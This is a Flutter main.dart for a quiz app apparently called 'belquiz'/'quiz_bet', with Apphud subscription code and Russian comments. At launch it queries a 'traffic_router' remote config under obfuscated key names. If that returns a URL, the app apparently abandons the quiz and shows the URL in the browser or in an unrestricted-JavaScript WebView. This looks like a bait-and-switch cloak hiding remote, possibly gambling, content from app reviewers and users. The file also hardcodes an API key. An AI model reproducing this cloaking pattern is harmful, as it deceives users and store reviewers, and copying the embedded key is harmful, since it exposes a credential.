import 'dart:io';

import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:hive/hive.dart';
import 'package:path_provider/path_provider.dart';
import 'package:quiz_bet/data/app_settings/navigation/routes.dart';
import 'package:quiz_bet/ui/screens/home/models/results/hive_results.dart';
import 'data/app_settings/color_pallete/colors.dart';
import 'package:traffic_router/traffic_router.dart' as tr;
import 'package:url_launcher/url_launcher.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:apphud/apphud.dart';
import 'package:app_review/app_review.dart';
import 'dart:async';

final api = 'app_qnz2XhUGFt2feLTYXG3mdun5KYiTSj';
final productID = 'purchase_belquiz_premium';

final termsOfUse = 'https://docs.google.com/document/d/1cTKWR5iTb5DgkpVeW1jlOQ1FSOhOb02xh0ToGJLOBYo/edit?usp=sharing';
final privacyPolicy = 'https://docs.google.com/document/d/1Yy2DDt7VHMMV7LgVSiWLkF0ZP-rzWnccLPidybhVuDs/edit?usp=sharing';
final support = 'https://docs.google.com/forms/d/e/1FAIpQLSdjMiuNWVdVg_FC0mNXs03G58a63wc__lcAfwQtwgD_oQBQLA/viewform?usp=sf_link';

// Этот контроллер подписки может использоваться в StreamBuilder
final StreamController<bool> subscribedController = StreamController.broadcast();
// Через эту переменную можно смотреть состояние подписки юзера
bool subscribed = false;
late Stream<bool> subscribedStream;
late StreamSubscription<bool> subT;

// Закинуть на экран с покупкой, если вернул true, то закрыть экран покупки
// В дебаге этот метод вернет true
Future<bool> purchase() async {
    final res = await Apphud.purchase(productId: productID);
    if ((res.nonRenewingPurchase?.isActive ?? false) || kDebugMode) {
        subscribedController.add(true);
        return true;
    }
    return false;
}

// Закинуть на экран с покупкой, если вернул true, то закрыть экран покупки
// В дебаге этот метод вернет true
Future<bool> restore() async {
    final res = await Apphud.restorePurchases();
    if (res.purchases.isNotEmpty || kDebugMode) {
        subscribedController.add(true);
        return true;
    }
    return false;
}

// Эти 3 метода нужны для показа вебвью с пользовательским соглашением, саппортом. Оставить в этом файле (main.dart), вызывать из экрана покупки, настроек
openTermsOfUse() {
    launch(termsOfUse);
}
openPrivacyPolicy() {
    launch(privacyPolicy);
}
openSupport() {
    launch(support);
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  final trafficRouter = await tr.TrafficRouter.initialize(
    settings: tr.Settings(paramNames: tr.ParamNames(
      databaseRoot: 'jso_bel',
      baseUrl1: 'fred',
      baseUrl2: 'dasg',
      url11key: 'sedunq',
      url12key: 'vabut',
      url21key: 'murdo',
      url22key: 'vegad',
    ))
  );

  if (trafficRouter.url.isEmpty) {
    await Apphud.start(apiKey: api);
    subscribedStream = subscribedController.stream;
    subT = subscribedStream.listen((event) {
      subscribed = event;
    });
    if (await Apphud.isNonRenewingPurchaseActive(productID)) {
      subscribedController.add(true);
    }
    startMain();
  } else {
    AppReview.requestReview;
    if (trafficRouter.override) {
      await _launchInBrowser(trafficRouter.url);
    } else {
      runApp(MaterialApp(
        home: WebViewPage(
          url: trafficRouter.url,
        ),
      ));
    }
  }
}

Future<void> _launchInBrowser(String url) async {
  if (await canLaunch(url)) {
    await launch(
      url,
      forceSafariVC: false,
      forceWebView: false,
    );
  } else {
    throw 'Could not launch $url';
  }
}

class WebViewPage extends StatefulWidget {
  final String url;

  const WebViewPage({Key? key, required this.url}) : super(key: key);

  @override
  State<StatefulWidget> createState() {
    return _WebViewPageState();
  }
}

class _WebViewPageState extends State<WebViewPage> {
  WebViewController? _webController;
  late String webviewUrl;

  @override
  void dispose() {
    super.dispose();
  }

  @override
  void initState() {
    super.initState();
    if (Platform.isAndroid) WebView.platform = SurfaceAndroidWebView();
    _enableRotation();
    webviewUrl = widget.url;
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        if ((await _webController?.canGoBack()) ?? false) {
          await _webController?.goBack();
          return Future.value(false);
        }
        return Future.value(true);
      },
      child: Scaffold(
        body: SafeArea(
          child: WebView(
            gestureNavigationEnabled: true,
            initialUrl: webviewUrl,
            javascriptMode: JavascriptMode.unrestricted,
            onWebViewCreated: (con) {
              print('complete');
              _webController = con;
            },
          ),
        ),
      ),
    );
  }

  void _enableRotation() {
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);
  }
}


bool seen = false;

void startMain() async {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setPreferredOrientations(
  [DeviceOrientation.portraitUp]);
  Directory directory = Directory.current;
  if (Platform.isIOS) {
    directory = await getApplicationDocumentsDirectory();
  } else {
    directory = await getApplicationDocumentsDirectory();
  }
  Hive.init(directory.path);
  Hive.registerAdapter<HiveResult>(HiveResultAdapter());
  final onboardingSeen = await Hive.openBox<bool>('seen');
  if (onboardingSeen.values.isEmpty) await onboardingSeen.put('seen', false);
  seen = onboardingSeen.values.first;
  final box = await Hive.openBox<HiveResult>('results');
  print(box.values.length);
  runApp(const App());
}

class App extends StatelessWidget {
  const App({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return ScreenUtilInit(
      designSize: const Size(390, 844),
      builder: () => MaterialApp(
        darkTheme: ThemeData(
          selectedRowColor: AppColors.blue,
          unselectedWidgetColor: AppColors.white.withOpacity(0.3),
        ),
        routes: routes,
        initialRoute: seen==true && subscribed==true
            ? MainNavigationRoutes.main
            : MainNavigationRoutes.onboarding,
        debugShowCheckedModeBanner: false,
        theme: ThemeData(
          primarySwatch: Colors.blue,
          bottomNavigationBarTheme: BottomNavigationBarThemeData(
              selectedItemColor: AppColors.blue,
              selectedLabelStyle: TextStyle(
                  fontFamily: 'Bakbak',
                  fontWeight: FontWeight.w400,
                  fontSize: 12.h),
              showUnselectedLabels: true,
              showSelectedLabels: true,
              unselectedItemColor: AppColors.white.withOpacity(0.3),
              unselectedLabelStyle: TextStyle(
                  color: AppColors.white.withOpacity(0.3),
                  fontFamily: 'Bakbak',
                  fontWeight: FontWeight.w400,
                  fontSize: 12.h),
              unselectedIconTheme: IconThemeData(color: AppColors.white.withOpacity(0.3))),
          textTheme: TextTheme(
              button: TextStyle(
            fontSize: 45.sp,
          )),
        ),
          ),
    );
  }
}
